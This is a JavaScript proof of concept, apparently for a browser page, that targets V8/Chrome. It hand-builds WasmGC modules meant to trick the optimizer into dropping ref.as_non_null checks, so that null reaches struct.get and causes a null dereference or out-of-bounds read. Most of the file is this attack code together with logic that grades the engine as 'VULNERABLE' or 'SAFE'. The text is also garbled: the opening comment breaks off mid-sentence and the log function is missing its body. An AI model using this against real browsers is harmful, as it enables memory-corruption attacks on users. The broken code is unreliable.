  VULNERABILITY THEORY:
  When the WasmGC type analyzer determines that a reference is non-nullable
  (e.g., from a br_on_null or ref.test branch), ref.as_non_null (0xD4) is
  considered redundant and eliminated during optimization.
  
  If the type analysis is incorrect due to:
  1. Phi merging skipping bottom-typed inputs from "unreachable" paths
  2. Branch analysis marking reachable paths as unreachable
  3. The TypedOptimizationsReducer replacing None-typed operations
  
  Then ref.as_non_null may be eliminated on a path where null can actually
  flow through. Subsequently, struct.get on null causes:
  - A null pointer dereference (crash)
  - Or an OOB read from address near 0 (if null check is the only guard)
  
  ATTACK PATTERN:
  1. Create a nullable ref type with struct fields
  2. Use a branch where the non-null path is considered certain
  3. Through loop iteration/Phi confusion, null flows into the "non-null" path
  4. ref.as_non_null is eliminated by the optimizer
  5. struct.get on null → crash/OOB
  
  This PoC uses br_on_null to split null/non-null paths, then uses
  exception handling and loop Phi merging to inject null into the

const resultsDiv = document.getElementById('results');

function log(msg, cls = 'INFO') {

  div.className = 'result ' + cls;

// =========================================================================
// Wasm Binary Encoding Helpers
// =========================================================================
function uleb128(value) {
  const r = [];
  if (value < 0) value = value >>> 0;
  do { let b = value & 0x7F; value >>>= 7; if (value) b |= 0x80; r.push(b); } while (value);
  return r;
}

function sleb128(value) {
  const r = [];
  while (true) {
    let b = value & 0x7F; value >>= 7;
    if ((value === 0 && !(b & 0x40)) || (value === -1 && (b & 0x40))) { r.push(b); break; }
    r.push(b | 0x80);
  }
  return r;
}

function f64Bytes(v) {
  const buf = new ArrayBuffer(8);
  new Float64Array(buf)[0] = v;
  return Array.from(new Uint8Array(buf));
}

function encodeString(s) {
  const b = new TextEncoder().encode(s);
  return [...uleb128(b.length), ...b];
}

function makeSection(id, content) {
  return [id, ...uleb128(content.length), ...content];
}

// V8 14.7 WasmGC constants
const WASM_HEADER = [0x00, 0x61, 0x73, 0x6D, 0x01, 0x00, 0x00, 0x00];
const REC_GROUP = 0x4E;
const FUNC_TYPE = 0x60;

const TYPE = {
  I32: 0x7F, I64: 0x7E, F32: 0x7D, F64: 0x7C,
  FUNCREF: 0x70, EXTERNREF: 0x6F, ANYREF: 0x6E, EQREF: 0x6D,
  STRUCTREF: 0x6B, REF: 0x64, REF_NULL: 0x63,
};

const SEC = {
  TYPE: 1, IMPORT: 2, FUNCTION: 3, TABLE: 4, MEMORY: 5,
  GLOBAL: 6, EXPORT: 7, START: 8, ELEMENT: 9, CODE: 10, DATA: 11, TAG: 13,
};

// Opcodes
const O = {
  UNREACHABLE: 0x00, NOP: 0x01, BLOCK: 0x02, LOOP: 0x03, IF: 0x04,
  ELSE: 0x05, TRY: 0x06, CATCH: 0x07, THROW: 0x08, END: 0x0B,
  BR: 0x0C, BR_IF: 0x0D, RETURN: 0x0F, CATCH_ALL: 0x19,
  DROP: 0x1A, SELECT: 0x1B,
  LOCAL_GET: 0x20, LOCAL_SET: 0x21, LOCAL_TEE: 0x22,
  GLOBAL_GET: 0x23, GLOBAL_SET: 0x24,
  I32_CONST: 0x41, I64_CONST: 0x42, F64_CONST: 0x44,
  I32_EQZ: 0x45, I32_EQ: 0x46, I32_NE: 0x47,
  I32_ADD: 0x6A, I32_SUB: 0x6B, I32_AND: 0x71,
  CALL: 0x10,
  REF_NULL: 0xD0, REF_IS_NULL: 0xD1, REF_AS_NON_NULL: 0xD4,
  BR_ON_NULL: 0xD5, BR_ON_NON_NULL: 0xD6,
  // GC prefix
  GC: 0xFB,
  STRUCT_NEW: 0x00, STRUCT_NEW_DEFAULT: 0x01,
  STRUCT_GET: 0x02, STRUCT_SET: 0x05,
  REF_TEST: 0x14, REF_TEST_NULL: 0x15,
  REF_CAST: 0x16, REF_CAST_NULL: 0x17,
};

// =========================================================================
// Test 1: Null confusion via loop Phi + br_on_null
// =========================================================================
async function testNullConfusion() {
  log('=== Test 1: Null Confusion via Loop Phi + br_on_null ===');
  log('Theory: After many iterations, the type analyzer believes the');
  log('Phi at the loop header is always non-null. ref.as_non_null is');
  log('eliminated. Then null is injected via exception path → crash or OOB.');

  try {
    // Types:
    //   0: struct $MyStruct { mut i32 (sentinel), mut i64 }
    //   1: func (i32, i32) -> i32  [test function]
    //   2: func () -> ()           [tag type]

    const typeSection = [
      0x01, REC_GROUP, 0x03,

      // Type 0: struct { mut i32, mut i64 }
      0x5F, 0x02,
      TYPE.I32, 0x01,
      TYPE.I64, 0x01,

      // Type 1: func (i32, i32) -> i32
      FUNC_TYPE, 0x02, TYPE.I32, TYPE.I32, 0x01, TYPE.I32,

      // Type 2: func () -> ()
      FUNC_TYPE, 0x00, 0x00,
    ];

    const tagSection = [0x01, 0x00, 0x02]; // 1 tag, exception, type 2

    const funcSection = [
      0x01, // 1 function
      0x01, // type index 1
    ];

    const exportSection = [
      0x01,
      ...encodeString('test_null'), 0x00, 0x00,
    ];

    // func 0: test_null(iterations: i32, inject_null_at: i32) -> i32
    //
    // Strategy:
    // - Loop with a (ref null $MyStruct) local
    // - On most iterations: create a valid struct, set to local
    // - When iteration == inject_null_at: set local to null via exception path
    // - After loop: ref.as_non_null then struct.get
    // - If ref.as_non_null was eliminated, null access happens
    //
    // The optimizer sees:
    //   - Forward edge: local is non-null (struct.new)
    //   - Loop iterations: local is always set to struct.new (non-null)
    //   - Exception path: rarely taken, might be considered unreachable
    //   - Phi type: non-null ref $MyStruct
    //   → ref.as_non_null eliminated
    //   → but at runtime, null was injected

    const funcBody = [
      // Locals: (ref null $MyStruct)
      0x01, 0x01,
      TYPE.REF_NULL, 0x00, // (ref null $MyStruct) - type index 0

      // local 0 = iterations (i32)
      // local 1 = inject_null_at (i32)
      // local 2 = $obj (ref null $MyStruct)

      // Initialize with a valid struct
      O.I32_CONST, ...sleb128(0x11111111), // sentinel
      O.I64_CONST, ...sleb128(0x22222222),
      O.GC, O.STRUCT_NEW, 0x00,
      O.LOCAL_SET, 0x02,

      // block $exit
      O.BLOCK, 0x40,
        // loop $loop
        O.LOOP, 0x40,

          // if iterations == 0, exit
          O.LOCAL_GET, 0x00,
          O.I32_EQZ,
          O.BR_IF, 0x01,

          // Decrement
          O.LOCAL_GET, 0x00,
          O.I32_CONST, 0x01,
          O.I32_SUB,
          O.LOCAL_SET, 0x00,

          // Try block: on most iterations, create valid struct
          // On inject_null_at iteration: throw → catch sets null
          O.TRY, 0x40,

            // Check if this is the null-injection iteration
            O.LOCAL_GET, 0x00,
            O.LOCAL_GET, 0x01,
            O.I32_EQ,
            O.IF, 0x40,
              O.THROW, 0x00, // throw tag 0
            O.END,

            // Normal path: create valid struct
            O.I32_CONST, ...sleb128(0x33333333),
            O.I64_CONST, ...sleb128(0x44444444),
            O.GC, O.STRUCT_NEW, 0x00,
            O.LOCAL_SET, 0x02,

          O.CATCH_ALL,
            // Exception path: set $obj to null
            // The type analyzer may consider this path unreachable
            // if it thinks throw always transfers control
            O.REF_NULL, 0x00, // ref.null $MyStruct (heap type 0)
            O.LOCAL_SET, 0x02,
          O.END, // end try

          O.BR, 0x00, // br $loop
        O.END, // end loop
      O.END, // end block

      // After loop: $obj might be null if throw was triggered
      // The Phi at the loop header merges:
      //   - Forward edge: non-null (struct.new)
      //   - Normal loop body: non-null (struct.new)
      //   - Exception path: NULL
      // If exception path is bottom-typed and skipped,
      // Phi is typed as non-null → ref.as_non_null eliminated

      // Use ref.as_non_null to assert non-null
      O.LOCAL_GET, 0x02,
      O.REF_AS_NON_NULL, // 0xD4 - may be eliminated!

      // struct.get field 0 (i32) - if null, this is a null deref!
      O.GC, O.STRUCT_GET, 0x00, 0x00,

      O.END,
    ];

    function encodeBody(body) {
      return [...uleb128(body.length), ...body];
    }

    const codeSection = [0x01, ...encodeBody(funcBody)];

    const moduleBytes = [
      ...WASM_HEADER,
      ...makeSection(SEC.TYPE, typeSection),
      ...makeSection(SEC.FUNCTION, funcSection),
      ...makeSection(SEC.TAG, tagSection),
      ...makeSection(SEC.EXPORT, exportSection),
      ...makeSection(SEC.CODE, codeSection),
    ];

    const wasmBytes = new Uint8Array(moduleBytes);
    log(`Module built: ${wasmBytes.length} bytes`);

    const module = await WebAssembly.compile(wasmBytes);
    const instance = await WebAssembly.instantiate(module);
    log('Module compiled and instantiated');

    const { test_null } = instance.exports;
    let suspicious = 0;

    // Test 1A: Normal operation (no null injection)
    // inject_null_at = -1 means never inject
    log('--- Phase 1: Normal operation (no null injection) ---');
    const iterCounts = [10, 100, 1000, 10000, 50000, 100000];
    for (const iters of iterCounts) {
      try {
        const result = test_null(iters, -1); // never inject null
        if (result !== 0x33333333) {
          log(`iters=${iters}: result=0x${(result>>>0).toString(16)} expected=0x33333333 - WRONG VALUE`,
              'SUSPICIOUS');
          suspicious++;
        } else {
          log(`iters=${iters}: result=0x${(result>>>0).toString(16)} - OK`, 'SAFE');
        }
      } catch (e) {
        log(`iters=${iters}: ${e.message}`, 'INFO');
      }
    }

    // Test 1B: With null injection at last iteration
    // After many warm-up iterations, inject null on the last one
    log('--- Phase 2: Null injection at final iteration ---');
    for (const iters of [100, 1000, 10000, 50000, 100000]) {
      try {
        // inject_null_at = 0 means inject when counter reaches 0 (last iteration)
        const result = test_null(iters, 0);
        // If ref.as_non_null was properly enforced, this should trap
        // Getting a result means ref.as_non_null was ELIMINATED
        log(`iters=${iters}: GOT RESULT ${result} (0x${(result>>>0).toString(16)}) ` +
            `after null injection - ref.as_non_null MAY BE ELIMINATED!`, 'SUSPICIOUS');
        suspicious += 5;
        if (result === 0) {
          log(`  → result is 0, consistent with null deref reading zero page`, 'VULNERABLE');
          suspicious += 10;
        }
      } catch (e) {
        if (e instanceof WebAssembly.RuntimeError &&
            (e.message.includes('null') || e.message.includes('dereferencing'))) {
          log(`iters=${iters}: Properly trapped on null: ${e.message}`, 'SAFE');
        } else {
          log(`iters=${iters}: Unexpected error: ${e.message}`, 'SUSPICIOUS');
          suspicious++;
        }
      }
    }

    // Test 1C: Null injection at varying points to test optimization edge
    log('--- Phase 3: Null injection at varying iteration points ---');
    for (const total of [100000]) {
      for (const injectAt of [1, 10, 100, 1000, 50000]) {
        try {
          const result = test_null(total, injectAt);
          // After passing the inject point, subsequent iterations set obj back to struct
          // So this should be OK (unless the last iteration is after inject point)
          log(`total=${total} inject_at=${injectAt}: result=0x${(result>>>0).toString(16)}`, 'INFO');
        } catch (e) {
          if (e.message.includes('null')) {
            log(`total=${total} inject_at=${injectAt}: Null trap (expected if inject near end)`, 'SAFE');
          } else {
            log(`total=${total} inject_at=${injectAt}: ${e.message}`, 'INFO');
          }
        }
      }
    }

    if (suspicious >= 10) {
      log('VERDICT: VULNERABLE - ref.as_non_null eliminated, null deref possible', 'VULNERABLE');
    } else if (suspicious > 0) {
      log(`VERDICT: SUSPICIOUS (${suspicious} anomalies)`, 'SUSPICIOUS');
    } else {
      log('VERDICT: SAFE - ref.as_non_null properly enforced', 'SAFE');
    }

  } catch (e) {
    log(`Error: ${e.message}`, 'ERROR');
    log(`Stack: ${e.stack}`, 'ERROR');
  }
}

// =========================================================================
// Test 2: Simpler null confusion via br_on_null branch analysis
// =========================================================================
async function testBrOnNullConfusion() {
  log('');
  log('=== Test 2: br_on_null Branch Confusion ===');
  log('Theory: After br_on_null, the non-null path has a non-nullable');
  log('type. If the branch analysis is confused by Phi inputs, the');
  log('non-null assertion on the fallthrough may be incorrect.');

  try {
    // Types:
    //   0: struct $S { mut i32, mut f64 }
    //   1: func (i32) -> i32

    const typeSection = [
      0x01, REC_GROUP, 0x02,
      // Type 0: struct { mut i32, mut f64 }
      0x5F, 0x02,
      TYPE.I32, 0x01,
      TYPE.F64, 0x01,
      // Type 1: func(i32) -> i32
      FUNC_TYPE, 0x01, TYPE.I32, 0x01, TYPE.I32,
    ];

    const funcSection = [0x01, 0x01]; // 1 func, type 1
    const exportSection = [0x01, ...encodeString('test_br_null'), 0x00, 0x00];

    // func 0: test_br_null(iterations: i32) -> i32
    // Uses br_on_null to branch and test ref.as_non_null elimination
    //
    // Strategy:
    //   1. Loop creating structs, set null on last iteration
    //   2. After loop, use br_on_null to split null/non-null paths
    //   3. On non-null path: struct.get (should be safe)
    //   4. On null path: return -1
    //   5. If br_on_null is eliminated by optimizer → null deref
    const funcBody = [
      // Locals: (ref null $S)
      0x01,
      0x01, TYPE.REF_NULL, 0x00,  // local 1: (ref null $S)

      // local 0 = iterations, local 1 = $obj

      // Initialize with non-null struct
      O.I32_CONST, ...sleb128(0x77777777),
      O.F64_CONST, ...f64Bytes(1.5),
      O.GC, O.STRUCT_NEW, 0x00,
      O.LOCAL_SET, 0x01,

      // block $exit (void)
      O.BLOCK, 0x40,
        // loop $loop (void)
        O.LOOP, 0x40,
          O.LOCAL_GET, 0x00,
          O.I32_EQZ,
          O.BR_IF, 0x01, // exit loop

          O.LOCAL_GET, 0x00,
          O.I32_CONST, 0x01,
          O.I32_SUB,
          O.LOCAL_SET, 0x00,

          // Create struct on most iterations, null on last (iterations==0)
          O.LOCAL_GET, 0x00,
          O.I32_EQZ,
          O.IF, 0x40,
            // Last iteration: set null
            O.REF_NULL, 0x00,
            O.LOCAL_SET, 0x01,
          O.ELSE,
            // Normal: create valid struct
            O.I32_CONST, ...sleb128(0x77777777),
            O.F64_CONST, ...f64Bytes(1.5),
            O.GC, O.STRUCT_NEW, 0x00,
            O.LOCAL_SET, 0x01,
          O.END,

          O.BR, 0x00,
        O.END, // end loop
      O.END, // end block

      // After loop: $obj is either non-null struct or null
      // Use br_on_null to branch on null
      // block $null_handler (void)
      O.BLOCK, 0x40,
        O.LOCAL_GET, 0x01,
        O.BR_ON_NULL, 0x00, // if null, br to $null_handler (void block)

        // Fallthrough: value is non-null (ref $S) on the stack
        // The type analyzer should know this is non-null here
        O.GC, O.STRUCT_GET, 0x00, 0x00, // struct.get $S field 0
        O.RETURN, // return the i32 value

      O.END, // end block (null handler)

      // Null path: return -1
      O.I32_CONST, ...sleb128(-1),

      O.END, // end func
    ];

    function encodeBody(body) {
      return [...uleb128(body.length), ...body];
    }

    const codeSection = [0x01, ...encodeBody(funcBody)];

    const moduleBytes = [
      ...WASM_HEADER,
      ...makeSection(SEC.TYPE, typeSection),
      ...makeSection(SEC.FUNCTION, funcSection),
      ...makeSection(SEC.EXPORT, exportSection),
      ...makeSection(SEC.CODE, codeSection),
    ];

    const wasmBytes = new Uint8Array(moduleBytes);
    log(`Module built: ${wasmBytes.length} bytes`);

    const module = await WebAssembly.compile(wasmBytes);
    const instance = await WebAssembly.instantiate(module);
    log('Compiled successfully');

    const { test_br_null } = instance.exports;
    let suspicious = 0;

    const iterCounts = [2, 5, 10, 100, 1000, 10000, 50000, 100000];
    for (const iters of iterCounts) {
      try {
        const result = test_br_null(iters);
        // With null injection on last iteration, br_on_null should catch it
        // result should be -1 (null handler)
        if (result === -1) {
          log(`iters=${iters}: result=-1 (null handled correctly)`, 'SAFE');
        } else if (result === 0x77777777) {
          // This means the last struct was used (not null on last iter)
          log(`iters=${iters}: result=0x${(result>>>0).toString(16)} (struct value)`, 'SAFE');
        } else if (result === 0) {
          log(`iters=${iters}: result=0 - POSSIBLE NULL DEREF (read from null/zero page)`,
              'VULNERABLE');
          suspicious += 10;
        } else {
          log(`iters=${iters}: result=0x${(result>>>0).toString(16)} - unexpected`, 'SUSPICIOUS');
          suspicious++;
        }
      } catch (e) {
        if (e.message.includes('null')) {
          log(`iters=${iters}: Trapped on null (runtime check effective)`, 'SAFE');
        } else {
          log(`iters=${iters}: ${e.message}`, 'SUSPICIOUS');
          suspicious++;
        }
      }
    }

    if (suspicious >= 10) {
      log('VERDICT: VULNERABLE - null deref via br_on_null confusion', 'VULNERABLE');
    } else if (suspicious > 0) {
      log(`VERDICT: SUSPICIOUS (${suspicious} anomalies)`, 'SUSPICIOUS');
    } else {
      log('VERDICT: SAFE - br_on_null properly handled', 'SAFE');
    }

  } catch (e) {
    log(`Error: ${e.message}`, 'ERROR');
    log(`Stack: ${e.stack}`, 'ERROR');
  }
}

// Main
// =========================================================================
async function runAllTests() {
  resultsDiv.innerHTML = '';
  log('WasmGC Null Confusion via ref.as_non_null Elimination');
  log(`Target: V8 14.7.0 / Chrome 145.0.7632.116`);

  log(`Date: ${new Date().toISOString()}`);

  await testNullConfusion();
  await testBrOnNullConfusion();

}
